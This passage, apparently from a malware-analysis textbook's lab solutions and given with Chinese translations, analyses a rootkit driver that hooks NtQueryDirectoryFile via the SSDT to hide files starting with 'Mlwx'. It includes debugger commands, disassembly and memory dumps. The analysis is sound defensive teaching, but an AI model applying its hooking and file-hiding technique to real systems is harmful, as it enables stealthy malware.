    WriteFile, we know that it will write to a file at some point. We also see calls
    to LoadResource and SizeOfResource, which tell us that this program will do something
    with the resource section of *Lab10-02.exe*.
  id: totrans-2664
  prefs: []
  type: TYPE_NORMAL
  zh: 查看此可执行文件的导入部分，我们看到对CloseServiceHandle、CreateServiceA、OpenSCManagerA和StartServiceA的导入，这告诉我们该程序将创建并启动一个服务。因为程序还调用了CreateFile和WriteFile，我们知道它将在某个时候写入文件。我们还看到对LoadResource和SizeOfResource的调用，这告诉我们该程序将对*Lab10-02.exe*的资源部分做些事情。
- en: Recognizing that the program accesses the resource section, we use Resource
    Hacker to examine the resource section. There, we see that the file contains another
    PE header within the resource section, as shown in Figure 10-1L. This is probably
    another file of malicious code that *Lab10-02.exe* will use.
  id: totrans-2665
  prefs: []
  type: TYPE_NORMAL
  zh: 认识到程序访问资源部分后，我们使用Resource Hacker来检查资源部分。在那里，我们看到文件在资源部分中包含另一个PE头，如图10-1L所示。这可能是另一个恶意代码文件，*Lab10-02.exe*将使用。
- en: Next, we run the program and find that it creates a file and a service.
  id: totrans-2666
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们运行程序，发现它创建了一个文件和一个服务。
- en: Using procmon, we see that the program creates a file in *C:\Windows\System32*,
    and that it creates a service that uses that file as the executable. That file
    contains the kernel code that will be loaded by the OS.
  id: totrans-2667
  prefs: []
  type: TYPE_NORMAL
  zh: 使用procmon，我们看到程序在*C:\Windows\System32*中创建了一个文件，并且创建了一个使用该文件作为可执行文件的服务。该文件包含将被操作系统加载的内核代码。
- en: We should next find the file that the program creates in order to analyze it
    and determine what the kernel code is doing. However, when we look in **554**
  id: totrans-2668
  prefs: []
  type: TYPE_NORMAL
  zh: 我们接下来应该找到程序创建的文件，以便分析它并确定内核代码正在做什么。然而，当我们查看**554**
- en: Appendix C
  id: totrans-2669
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-2670
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 124](index-588_1.png)'
  id: totrans-2671
  prefs: []
  type: TYPE_IMG
  zh: '![Image 124](index-588_1.png)'
- en: '*C:\Windows\System32*, we find that there’s nothing there. We can see in procmon
    that the file is created, and there are no calls that would delete the file.'
  id: totrans-2672
  prefs: []
  type: TYPE_NORMAL
  zh: '*C:\Windows\System32*，我们发现那里什么都没有。我们可以在procmon中看到文件被创建，但没有删除文件的调用。'
- en: Based on the facts that the file doesn’t appear but we don’t see how it was
    deleted and that a driver is involved, we should be suspicious that we’re dealing
    with a rootkit.
  id: totrans-2673
  prefs: []
  type: TYPE_NORMAL
  zh: 基于文件未出现但我们看不到它是如何被删除的，以及涉及驱动程序的事实，我们应该怀疑我们正在处理一个rootkit。
- en: '**10**'
  id: totrans-2674
  prefs: []
  type: TYPE_NORMAL
  zh: '**10**'
- en: '*Figure 10-1L: An executable file stored in the resource section of* Lab10-02.exe
    **Finding the Rootkit**'
  id: totrans-2675
  prefs: []
  type: TYPE_NORMAL
  zh: '*图10-1L：存储在Lab10-02.exe资源部分的可执行文件* 寻找rootkit'
- en: In order to continue investigating, we want to check to see if our kernel driver
    is loaded. To do that, we use the sc command to check on the status of the service
    that is running our kernel driver, as shown in Listing 10-8L.
  id: totrans-2676
  prefs: []
  type: TYPE_NORMAL
  zh: 为了继续调查，我们想检查我们的内核驱动程序是否已加载。为此，我们使用sc命令检查运行内核驱动程序的服务状态，如列表10-8L所示。
- en: C:\> **sc query "486 WS Driver"** 
  id: totrans-2677
  prefs: []
  type: TYPE_NORMAL
  zh: C:\> **sc query "486 WS Driver"** 
- en: 'SERVICE_NAME: 486 WS Driver'
  id: totrans-2678
  prefs: []
  type: TYPE_NORMAL
  zh: 'SERVICE_NAME: 486 WS Driver'
- en: 'TYPE :'
  id: totrans-2679
  prefs: []
  type: TYPE_NORMAL
  zh: 'TYPE :'
- en: 1 KERNEL_DRIVER
  id: totrans-2680
  prefs: []
  type: TYPE_NORMAL
  zh: 1 KERNEL_DRIVER
- en: 'STATE : 4 RUNNING'
  id: totrans-2681
  prefs: []
  type: TYPE_NORMAL
  zh: 'STATE : 4 RUNNING'
- en: (STOPPABLE,NOT_PAUSABLE,IGNORES_SHUTDOWN)
  id: totrans-2682
  prefs: []
  type: TYPE_NORMAL
  zh: (STOPPABLE,NOT_PAUSABLE,IGNORES_SHUTDOWN)
- en: 'WIN32_EXIT_CODE : 0 (0x0)'
  id: totrans-2683
  prefs: []
  type: TYPE_NORMAL
  zh: 'WIN32_EXIT_CODE : 0 (0x0)'
- en: 'SERVICE_EXIT_CODE : 0 (0x0)'
  id: totrans-2684
  prefs: []
  type: TYPE_NORMAL
  zh: 'SERVICE_EXIT_CODE : 0 (0x0)'
- en: 'CHECKPOINT : 0x0'
  id: totrans-2685
  prefs: []
  type: TYPE_NORMAL
  zh: 'CHECKPOINT : 0x0'
- en: 'WAIT_HINT : 0x0'
  id: totrans-2686
  prefs: []
  type: TYPE_NORMAL
  zh: 'WAIT_HINT : 0x0'
- en: '*Listing 10-8L: Using the sc command to get information about a service* We
    query for the service name 486 WS Driver at , which was specified in the call
    to CreateServiceA. We see at  that the service is still running, which tells
    us that the kernel code is in memory. Something fishy is going on because the
    driver is still running, but it’s not on disk. Now, to determine what’s going
    on, we connect the kernel debugger to our virtual machine, and we check to see
    if the driver was actually loaded using the lm command. We see an entry that matches
    the filename that was created by *Lab10-02.exe*: f7c4d000 f7c4dd80 Mlwx486 (deferred)'
  id: totrans-2687
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表10-8L：使用sc命令获取关于服务的信息* 我们查询了在CreateServiceA调用中指定的服务名称486 WS Driver，我们看到处服务仍在运行，这告诉我们内核代码在内存中。因为驱动程序仍在运行，但不在磁盘上，所以有些事情不对劲。现在，为了确定发生了什么，我们将内核调试器连接到我们的虚拟机，并使用lm命令检查驱动程序是否实际加载。我们看到一个与*Lab10-02.exe*创建的文件名匹配的条目：f7c4d000
    f7c4dd80 Mlwx486 (deferred)'
- en: Solutions to Labs
  id: totrans-2688
  prefs: []
  type: TYPE_NORMAL
  zh: 实验室解决方案
- en: '**555**'
  id: totrans-2689
  prefs: []
  type: TYPE_NORMAL
  zh: '**555**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-2690
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: We are now certain that the driver is loaded into memory with the filename *Mlwx486.sys*,
    but the file does not appear on disk, suggesting that this might be a rootkit.
  id: totrans-2691
  prefs: []
  type: TYPE_NORMAL
  zh: 我们现在可以确定驱动程序已以*Mlwx486.sys*的文件名加载到内存中，但文件没有出现在磁盘上，这表明这可能是rootkit。
- en: Next, we check the SSDT for any modified entries, as shown in Listing 10-9L.
  id: totrans-2692
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们检查SSDT中是否有任何被修改的条目，如列表10-9L所示。
- en: kd> dd dwo(KeServiceDescriptorTable) L100
  id: totrans-2693
  prefs: []
  type: TYPE_NORMAL
  zh: kd> dd dwo(KeServiceDescriptorTable) L100
- en: '...'
  id: totrans-2694
  prefs: []
  type: TYPE_NORMAL
  zh: '...'
- en: 80501dbc 8060cb50 8060cb50 8053c02e 80606e68
  id: totrans-2695
  prefs: []
  type: TYPE_NORMAL
  zh: 80501dbc 8060cb50 8060cb50 8053c02e 80606e68
- en: 80501dcc 80607ac8 **f7c4d486** 805b3de0 8056f3ca
  id: totrans-2696
  prefs: []
  type: TYPE_NORMAL
  zh: 80501dcc 80607ac8 **f7c4d486** 805b3de0 8056f3ca
- en: 80501ddc 806053a4 8056c222 8060c2dc 8056fc46
  id: totrans-2697
  prefs: []
  type: TYPE_NORMAL
  zh: 80501ddc 806053a4 8056c222 8060c2dc 8056fc46
- en: '...'
  id: totrans-2698
  prefs: []
  type: TYPE_NORMAL
  zh: '...'
- en: '*Listing 10-9L: An excerpt from the SSDT with one entry that has been modified
    by a rootkit* We see that the entry at  is in a memory location that is clearly
    outside the bounds of the ntoskrnl module but within the loaded *Mlwx486.sys*
    driver.'
  id: totrans-2699
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表10-9L：SSDT的一个摘录，其中有一个条目被rootkit修改* 我们看到处的条目位于ntoskrnl模块边界之外的内存位置，但位于已加载的*Mlwx486.sys*驱动程序内。'
- en: To determine which normal function is being replaced, we revert our virtual
    machine to before the rootkit was installed to see which function was stored at
    the offset into the SSDT that was overwritten. In this case, the function is NtQueryDirectoryFile,
    which is a versatile function that retrieves information about files and directories
    used by FindFirstFile and FindNextFile to traverse directory structures. This
    function is also used by Windows Explorer to display files and directories. If
    the rootkit is hooking this function, it could be hiding files, which would explain
    why we can’t find *Mlwx486.sys*. Now that we’ve found a function that is hooking
    the SSDT, we must analyze what that function is doing.
  id: totrans-2700
  prefs: []
  type: TYPE_NORMAL
  zh: 为了确定哪个正常函数被替换，我们将虚拟机恢复到rootkit安装之前的状态，以查看哪个函数存储在覆盖了SSDT偏移处的函数中。在这种情况下，该函数是NtQueryDirectoryFile，这是一个多功能函数，用于检索FindFirstFile和FindNextFile用于遍历目录结构的文件和目录信息。此函数还由Windows资源管理器用于显示文件和目录。如果rootkit正在钩此函数，它可能会隐藏文件，这可以解释为什么我们找不到*Mlwx486.sys*。现在我们已经找到了一个正在钩SSDT的函数，我们必须分析该函数正在做什么。
- en: '**Examining the Hook Function**'
  id: totrans-2701
  prefs: []
  type: TYPE_NORMAL
  zh: '**检查钩子函数**'
- en: We now look more closely at the function called instead of NtQueryDirectoryFile,
    which we’ll call PatchFunction. The malicious PatchFunction must work with the
    same interface as the original function, so we first check the documentation of
    the original function. We find that NtQueryDirectoryFile is technically undocumented
    according to Microsoft, but a quick Internet search will provide all the information
    we need. The NtQueryDirectoryFile function is a very flexible one with a lot of
    different parameters that determine what will be returned.
  id: totrans-2702
  prefs: []
  type: TYPE_NORMAL
  zh: 我们现在更仔细地查看调用NtQueryDirectoryFile而不是该函数的函数，我们将它称为PatchFunction。恶意的PatchFunction必须与原始函数具有相同的接口，因此我们首先检查原始函数的文档。我们发现根据微软的说法，NtQueryDirectoryFile在技术上是未记录的，但快速的网络搜索将提供我们所需的所有信息。NtQueryDirectoryFile函数是一个非常灵活的函数，具有许多不同的参数，这些参数决定了将返回什么。
- en: Now, we want to look at the malicious function to see what is being done with
    the requests. We set a breakpoint on PatchFunction and discover that the first
    thing it does is call the original NtQueryDirectoryFile with all of the original
    parameters, as shown in Listing 10-10L.
  id: totrans-2703
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，我们想查看恶意函数对请求做了什么。我们在PatchFunction上设置了一个断点，并发现它首先调用原始的NtQueryDirectoryFile，使用所有原始参数，如列表10-10L所示。
- en: f7c4d490 ff7530 push dword ptr [ebp+30h]
  id: totrans-2704
  prefs: []
  type: TYPE_NORMAL
  zh: f7c4d490 ff7530 push dword ptr [ebp+30h]
- en: f7c4d493 ff752c push dword ptr [ebp+2Ch]
  id: totrans-2705
  prefs: []
  type: TYPE_NORMAL
  zh: f7c4d493 ff752c push dword ptr [ebp+2Ch]
- en: f7c4d496 ff7528 push dword ptr [ebp+28h]
  id: totrans-2706
  prefs: []
  type: TYPE_NORMAL
  zh: f7c4d496 ff7528 push dword ptr [ebp+28h]
- en: f7c4d499 ff7524 push dword ptr [ebp+24h]
  id: totrans-2707
  prefs: []
  type: TYPE_NORMAL
  zh: f7c4d499 ff7524 push dword ptr [ebp+24h]
- en: f7c4d49c ff7520 push dword ptr [ebp+20h]
  id: totrans-2708
  prefs: []
  type: TYPE_NORMAL
  zh: f7c4d49c ff7520 push dword ptr [ebp+20h]
- en: f7c4d49f 56 push esi
  id: totrans-2709
  prefs: []
  type: TYPE_NORMAL
  zh: f7c4d49f 56 push esi
- en: f7c4d4a0 ff7518 push dword ptr [ebp+18h]
  id: totrans-2710
  prefs: []
  type: TYPE_NORMAL
  zh: f7c4d4a0 ff7518 push dword ptr [ebp+18h]
- en: f7c4d4a3 ff7514 push dword ptr [ebp+14h]
  id: totrans-2711
  prefs: []
  type: TYPE_NORMAL
  zh: f7c4d4a3 ff7514 push dword ptr [ebp+14h]
- en: '**556**'
  id: totrans-2712
  prefs: []
  type: TYPE_NORMAL
  zh: '**556**'
- en: Appendix C
  id: totrans-2713
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-2714
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: f7c4d4a6 ff7510 push dword ptr [ebp+10h]
  id: totrans-2715
  prefs: []
  type: TYPE_NORMAL
  zh: f7c4d4a6 ff7510 push dword ptr [ebp+10h]
- en: f7c4d4a9 ff750c push dword ptr [ebp+0Ch]
  id: totrans-2716
  prefs: []
  type: TYPE_NORMAL
  zh: f7c4d4a9 ff750c push dword ptr [ebp+0Ch]
- en: f7c4d4ac ff7508 push dword ptr [ebp+8]
  id: totrans-2717
  prefs: []
  type: TYPE_NORMAL
  zh: f7c4d4ac ff7508 push dword ptr [ebp+8]
- en: 'f7c4d4af e860000000 call Mlwx486+0x514 (f7c4d514) *Listing 10-10L: Assembly
    listing of PatchFunction*'
  id: totrans-2718
  prefs: []
  type: TYPE_NORMAL
  zh: f7c4d4af e860000000 call Mlwx486+0x514 (f7c4d514) *列表10-10L：PatchFunction的汇编列表*
- en: '**NOTE**'
  id: totrans-2719
  prefs: []
  type: TYPE_NORMAL
  zh: '**注意**'
- en: '*It’s probably not completely clear from Listing 10-10L that the function being
    called is* *NtQueryDirectoryFile. However, if we single-step over the call function,
    we see that it* *goes to another section of the file that jumps to NtQueryDirectoryFile.
    In IDA Pro, this* *call would have been labeled NtQueryDirectoryFile, but the
    disassembler included in* *WinDbg is much less sophisticated. Ideally, we would
    have the file to view in IDA Pro* *while we are debugging, but we can’t find this
    file because it’s hidden.*'
  id: totrans-2720
  prefs: []
  type: TYPE_NORMAL
  zh: '*从列表10-10L中可能并不完全清楚被调用的函数是* *NtQueryDirectoryFile。然而，如果我们单步执行调用函数，我们会看到它* *跳转到文件的另一个部分，该部分跳转到NtQueryDirectoryFile。在IDA
    Pro中，这个* *调用将被标记为NtQueryDirectoryFile，但WinDbg中包含的反汇编器要简单得多。理想情况下，我们希望在调试时在IDA
    Pro中查看文件，但我们找不到这个文件，因为它被隐藏了。*'
- en: The PatchFunction checks the eighth parameter, FileInformationClass, and if
    it is any value other than 3, it returns NtQueryDirectoryFile’s original return
    value. It also checks the return value from NtQueryDirectoryFile and the value
    of the ninth parameter, ReturnSingleEntry. PatchFunction is looking for certain
    parameters. If the parameters don’t meet the criteria, then the functionality
    **10**
  id: totrans-2721
  prefs: []
  type: TYPE_NORMAL
  zh: 补丁函数检查第八个参数，FileInformationClass，如果它不是3的任何值，则返回NtQueryDirectoryFile的原始返回值。它还检查NtQueryDirectoryFile的返回值和第九个参数，ReturnSingleEntry的值。补丁函数正在寻找某些参数。如果参数不符合标准，则该功能**10**
- en: is exactly the same as the original NtQueryDirectoryFile. If the parameters
    do meet the criteria, PatchFunction will change the return value, which is what
    we’re interested in. To examine what happens during a call to PatchFunction with
    the correct parameters, we set a breakpoint on PatchFunction.
  id: totrans-2722
  prefs: []
  type: TYPE_NORMAL
  zh: 与原始的NtQueryDirectoryFile完全相同。如果参数符合标准，补丁函数将更改返回值，这是我们感兴趣的。为了检查具有正确参数的补丁函数调用期间发生的情况，我们在补丁函数上设置断点。
- en: 'If we set a breakpoint on PatchFunction, it will break every time the function
    is called, but we’re interested in only some of the function calls. This is the
    perfect time to use a conditional breakpoint so that the breakpoint is hit only
    when the parameters to PatchFunction match our criteria. We set a breakpoint on
    PatchFunction, but the breakpoint will be hit only if the value of ReturnSingleEntry
    is 0, as follows:'
  id: totrans-2723
  prefs: []
  type: TYPE_NORMAL
  zh: 如果我们在补丁函数上设置断点，它将在每次函数调用时中断，但我们只对某些函数调用感兴趣。这是使用条件断点的完美时机，以便只有当补丁函数的参数符合我们的标准时，断点才会触发。我们在补丁函数上设置断点，但只有当ReturnSingleEntry的值为0时，断点才会触发，如下所示：
- en: kd> **bp f7c4d486 ".if dwo(esp+0x24)==0 {} .else {gc}"**
  id: totrans-2724
  prefs: []
  type: TYPE_NORMAL
  zh: kd> **bp f7c4d486 ".if dwo(esp+0x24)==0 {} .else {gc}"**
- en: '**NOTE**'
  id: totrans-2725
  prefs: []
  type: TYPE_NORMAL
  zh: '**注意**'
- en: '*If you have Windows Explorer open in a directory, you might see this breakpoint
    hit* *over and over again in different threads, which could be annoying while
    you’re trying* *to analyze the function. To make it easier to analyze, you should
    close all of your Windows Explorer windows and use the dir command at a command
    line to trigger the* *breakpoint.*'
  id: totrans-2726
  prefs: []
  type: TYPE_NORMAL
  zh: '*如果你在目录中打开了Windows资源管理器，你可能会在不同的线程中看到这个断点被触发一次又一次，这可能会在你尝试分析函数时很烦人。为了更容易分析，你应该关闭所有Windows资源管理器窗口，并在命令行中使用dir命令来触发断点。*'
- en: Once the code filters out interesting calls, we see another function stored
    at offset 0xf7c4d590\. Although it isn’t automatically labeled by WinDbg, we can
    determine that it is RtlCompareMemory by looking at the disassembly or stepping
    into the function call. The code in Listing 10-11L
  id: totrans-2727
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦代码过滤出有趣的调用，我们就会看到另一个存储在偏移量0xf7c4d590处的函数。尽管WinDbg没有自动标记它，但我们可以通过查看反汇编或进入函数调用来确定它是RtlCompareMemory。列表10-11L中的代码
- en: shows the call to RtlCompareMemory at .
  id: totrans-2728
  prefs: []
  type: TYPE_NORMAL
  zh: 显示了在处的RtlCompareMemory调用。
- en: f7c4d4ca 6a08 push 8
  id: totrans-2729
  prefs: []
  type: TYPE_NORMAL
  zh: f7c4d4ca 6a08 push 8
- en: f7c4d4cc 681ad5c4f7 push offset Mlwx486+0x51a (f7c4d51a) f7c4d4d1 8d465e lea
    eax,[esi+5Eh]
  id: totrans-2730
  prefs: []
  type: TYPE_NORMAL
  zh: f7c4d4cc 681ad5c4f7 push offset Mlwx486+0x51a (f7c4d51a) f7c4d4d1 8d465e lea
    eax,[esi+5Eh]
- en: f7c4d4d4 50 push eax
  id: totrans-2731
  prefs: []
  type: TYPE_NORMAL
  zh: f7c4d4d4 50 push eax
- en: f7c4d4d5 32db xor bl,bl
  id: totrans-2732
  prefs: []
  type: TYPE_NORMAL
  zh: f7c4d4d5 32db xor bl,bl
- en: f7c4d4d7 ff1590d5c4f7 call dword ptr [Mlwx486+0x590 (f7c4d590)]
  id: totrans-2733
  prefs: []
  type: TYPE_NORMAL
  zh: f7c4d4d7 ff1590d5c4f7 call dword ptr [Mlwx486+0x590 (f7c4d590)]
- en: Solutions to Labs
  id: totrans-2734
  prefs: []
  type: TYPE_NORMAL
  zh: 实验室解决方案
- en: '**557**'
  id: totrans-2735
  prefs: []
  type: TYPE_NORMAL
  zh: '**557**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-2736
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: f7c4d4dd 83f808 cmp eax,8
  id: totrans-2737
  prefs: []
  type: TYPE_NORMAL
  zh: f7c4d4dd 83f808 cmp eax,8
- en: 'f7c4d4e0 7512 jne Mlwx486+0x4f4 (f7c4d4f4) *Listing 10-11L: Comparison of the
    filename to determine whether the rootkit will modify the* *returned information
    from NtQueryDirectoryFile*'
  id: totrans-2738
  prefs: []
  type: TYPE_NORMAL
  zh: f7c4d4e0 7512 jne Mlwx486+0x4f4 (f7c4d4f4) *列表10-11L：比较文件名以确定rootkit是否会修改从NtQueryDirectoryFile返回的信息*
- en: We can now see what PatchFunction is comparing. As shown in Listing 10-11L,
    the first parameter to RtlCompareMemory is eax, which stores the offset at esi+5eh
    at , which is the offset to a filename. Earlier in our disassembly, we saw that
    esi was FileInformation, which contains the information filled in by NtQueryDirectoryFile.
    Examining the documentation for NtQueryDirectoryFile, we see that this is a FILE_BOTH_DIR_INFORMATION
    structure, and that an offset of 0x5E is where the filename is stored as a wide
    character string. (We could also use WinDbg to tell us what is stored there.)
  id: totrans-2739
  prefs: []
  type: TYPE_NORMAL
  zh: 我们现在可以看到补丁函数正在比较什么。如列表10-11L所示，RtlCompareMemory的第一个参数是eax，它存储了esi+5eh的偏移量，这是文件名的偏移量。在我们的反汇编中，我们看到了esi是FileInformation，它包含由NtQueryDirectoryFile填充的信息。检查NtQueryDirectoryFile的文档，我们看到这是一个FILE_BOTH_DIR_INFORMATION结构，偏移量0x5E是存储宽字符字符串文件名的地方。（我们也可以使用WinDbg来告诉我们那里存储了什么。）
- en: To see what is stored at location esi+5eh, we use the db command, as shown in
    Listing 10-12L. This reveals that the filename is *Installer.h*.
  id: totrans-2740
  prefs: []
  type: TYPE_NORMAL
  zh: 要查看esi+5eh位置存储的内容，我们使用db命令，如图表10-12L所示。这揭示了文件名为*Installer.h*。
- en: kd> **db esi+5e**
  id: totrans-2741
  prefs: []
  type: TYPE_NORMAL
  zh: kd> **db esi+5e**
- en: 036a302e 49 00 6e 00 73 00 74 00-61 00 6c 00 6c 00 65 00 **I.n.s.t.a.l.l.e**.
  id: totrans-2742
  prefs: []
  type: TYPE_NORMAL
  zh: 036a302e 49 00 6e 00 73 00 74 00-61 00 6c 00 6c 00 65 00 **I.n.s.t.a.l.l.e**.
- en: 036a303e 72 00 68 00 00 00 00 00-00 00 f6 bb be f0 6e 70 **r.h**...........np
    036a304e c7 01 47 c0 db 46 25 75-cb 01 50 1e c1 f0 6e 70 ..G..F%u..P...np 036a305e
    c7 01 50 1e c1 f0 6e 70-c7 01 00 00 00 00 00 00 ..P...np........
  id: totrans-2743
  prefs: []
  type: TYPE_NORMAL
  zh: 036a303e 72 00 68 00 00 00 00 00-00 00 f6 bb be f0 6e 70 **r.h**...........np
    036a304e c7 01 47 c0 db 46 25 75-cb 01 50 1e c1 f0 6e 70 ..G..F%u..P...np 036a305e
    c7 01 50 1e c1 f0 6e 70-c7 01 00 00 00 00 00 00 ..P...np........
- en: '*Listing 10-12L: Examining the first argument to RtlCompareMemory* The other
    operand of the comparison is the fixed location f7c4d51a, and we can use the db
    command to view that as well. Listing 10-13L shows that the second parameter to
    RtlCompareMemory stores the letters *Mlwx*, which reminds us of the driver *Mlwx486.sys*.'
  id: totrans-2744
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表10-12L：检查RtlCompareMemory的第一个参数* 比较的另一个操作数是固定位置f7c4d51a，我们也可以使用db命令来查看它。列表10-13L显示RtlCompareMemory的第二个参数存储了字母*Mlwx*，这让我们想起了驱动*Mlwx486.sys*。'
- en: kd> **db f7c4d51a**
  id: totrans-2745
  prefs: []
  type: TYPE_NORMAL
  zh: kd> **db f7c4d51a**
- en: f7c4d51a 4d 00 6c 00 77 00 78 00-00 00 00 00 00 00 00 00 **M.l.w.x**.........
  id: totrans-2746
  prefs: []
  type: TYPE_NORMAL
  zh: f7c4d51a 4d 00 6c 00 77 00 78 00-00 00 00 00 00 00 00 00 **M.l.w.x**.........
- en: f7c4d52a 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
  id: totrans-2747
  prefs: []
  type: TYPE_NORMAL
  zh: f7c4d52a 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
- en: f7c4d53a 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
  id: totrans-2748
  prefs: []
  type: TYPE_NORMAL
  zh: f7c4d53a 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
- en: '*Listing 10-13L: Examining the second argument to RtlCompareMemory* The call
    to RtlCompareMemory specifies a size of 8 bytes, which represents four characters
    in wide character strings. The code is comparing every file to see if it starts
    with the four characters *Mlwx*. We now have a pretty good idea that this driver
    is hiding files that begin with *Mlwx*.'
  id: totrans-2749
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表10-13L：检查RtlCompareMemory的第二个参数* 调用RtlCompareMemory指定了8字节的大小，这代表宽字符字符串中的四个字符。代码正在比较每个文件，看它是否以四个字符*Mlwx*开头。我们现在有相当充分的理由相信这个驱动正在隐藏以*Mlwx*开头的文件。'
- en: '**Hiding Files**'
  id: totrans-2750
  prefs: []
  type: TYPE_NORMAL
  zh: '**隐藏文件**'
- en: Having discovered which filenames PatchFunction will operate on, we analyze
    how it will change the return values of NtQueryDirectoryFile. Examining the documentation
    for NtQueryDirectoryFile, we see the FileInformation structure with a series of
    FILE_BOTH_DIR_INFORMATION structures. The first field in the FILE_BOTH_DIR_INFORMATION
    structure is the offset that points to the next FILE_BOTH_DIR_INFORMATION. As
    shown in Figure 10-2L, PatchFunction manipulates this field to hide certain files
    from the directory listing by moving the **558**
  id: totrans-2751
  prefs: []
  type: TYPE_NORMAL
  zh: 发现了PatchFunction将要操作的文件名后，我们分析了它将如何改变NtQueryDirectoryFile的返回值。查看NtQueryDirectoryFile的文档，我们看到一个包含一系列FILE_BOTH_DIR_INFORMATION结构的FileInformation结构。FILE_BOTH_DIR_INFORMATION结构中的第一个字段是一个偏移量，它指向下一个FILE_BOTH_DIR_INFORMATION。如图10-2L所示，PatchFunction通过移动**558**
- en: Appendix C
  id: totrans-2752
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-2753
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: offset forward to point to the next entry if the current entry has a filename
    beginning with *Mlwx*.
  id: totrans-2754
  prefs: []
  type: TYPE_NORMAL
  zh: 将偏移量向前移动以指向下一个条目，如果当前条目的文件名以*Mlwx*开头。
- en: Figure 10-2L shows what the return value of NtQueryDirectoryFile looks like
    for a directory that contains three files. There is one FILE_BOTH_DIR_INFORMATION
  id: totrans-2755
  prefs: []
  type: TYPE_NORMAL
  zh: 图10-2L显示了包含三个文件的目录的NtQueryDirectoryFile的返回值。对于每个文件，都有一个FILE_BOTH_DIR_INFORMATION
- en: structure for each file. Normally, the first structure would point to the second,
    and the second would point to the third, but the rootkit has modified the structure
    so that the first structure points to the third, thereby hiding the middle structure.
    This trick ensures that any files that begin with *Mlwx* are skipped and hidden
    from directory listings.
  id: totrans-2756
  prefs: []
  type: TYPE_NORMAL
  zh: 结构。通常，第一个结构会指向第二个，第二个会指向第三个，但rootkit修改了结构，使得第一个结构指向第三个，从而隐藏了中间的结构。这个技巧确保了以*Mlwx*开头的任何文件都会被跳过并从目录列表中隐藏。
- en: FILE_BOTH_DIR_INFORMATION
  id: totrans-2757
  prefs: []
  type: TYPE_NORMAL
  zh: FILE_BOTH_DIR_INFORMATION
- en: FILE_BOTH_DIR_INFORMATION
  id: totrans-2758
  prefs: []
  type: TYPE_NORMAL
  zh: FILE_BOTH_DIR_INFORMATION
- en: FILE_BOTH_DIR_INFORMATION
  id: totrans-2759
  prefs: []
  type: TYPE_NORMAL
  zh: FILE_BOTH_DIR_INFORMATION
- en: '**10**'
  id: totrans-2760
  prefs: []
  type: TYPE_NORMAL
  zh: '**10**'
- en: '*Figure 10-2L: A series of FILE_BOTH_DIR_INFORMATION structures being* *modified
    so that the middle structure is hidden*'
  id: totrans-2761
  prefs: []
  type: TYPE_NORMAL
  zh: '*图10-2L：一系列FILE_BOTH_DIR_INFORMATION结构被* *修改，使得中间的结构被隐藏*'
- en: '**Recovering the Hidden File**'
  id: totrans-2762
  prefs: []
  type: TYPE_NORMAL
  zh: '**恢复隐藏的文件**'
- en: 'Having identified the program that is hiding files, we can try to obtain the
    original file used by the driver in order to perform additional analysis. There
    are several ways to do this:'
  id: totrans-2763
  prefs: []
  type: TYPE_NORMAL
  zh: 在确定了隐藏文件的程序之后，我们可以尝试获取驱动程序使用的原始文件，以便进行进一步分析。有几种方法可以做到这一点：
- en: 1\.
  id: totrans-2764
  prefs: []
  type: TYPE_NORMAL
  zh: '1.'
- en: Disable the service that starts the driver and reboot. When you reboot, the
    code won’t be running and the file won’t be hidden.
  id: totrans-2765
  prefs: []
  type: TYPE_NORMAL
  zh: 禁用启动驱动程序的服务并重启。当您重启时，代码将不会运行，文件也不会被隐藏。
- en: 2\.
  id: totrans-2766
  prefs: []
  type: TYPE_NORMAL
  zh: '2.'
- en: Extract the file from the resource section of the executable file that installed
    it.
  id: totrans-2767
  prefs: []
  type: TYPE_NORMAL
  zh: 从安装它的可执行文件的资源部分提取文件。
- en: 3\.
  id: totrans-2768
  prefs: []
  type: TYPE_NORMAL
  zh: '3.'
- en: Access the file even though it’s not available in the directory listing.
  id: totrans-2769
  prefs: []
  type: TYPE_NORMAL
  zh: 即使文件不在目录列表中，也能访问该文件。
- en: The hook to NtQueryDirectoryFile prevents the file from being shown in a directory
    listing, but the file still exists. For example, you could copy the file using
    the DOS command copy Mlwx486.sys NewFilename.sys. The *NewFilename.sys* file would
    not be hidden.
  id: totrans-2770
  prefs: []
  type: TYPE_NORMAL
  zh: 对 NtQueryDirectoryFile 的钩子阻止文件在目录列表中显示，但文件仍然存在。例如，您可以使用 DOS 命令 copy Mlwx486.sys
    NewFilename.sys 来复制文件。*NewFilename.sys* 文件将不会被隐藏。
- en: All of these options are simple enough, but the first is the best because it
    disables the driver. With the driver disabled, you should first search your system
    for files beginning with *Mlwx* in case there are other files being hidden by
    the *Mlwx486.sys* driver. (There are none in this case.) Opening *Mlwx486.sys*
    in IDA Pro, we see that it is very small, so we should analyze all of it to make
    sure that the driver isn’t doing anything else that we’re not aware of. We see
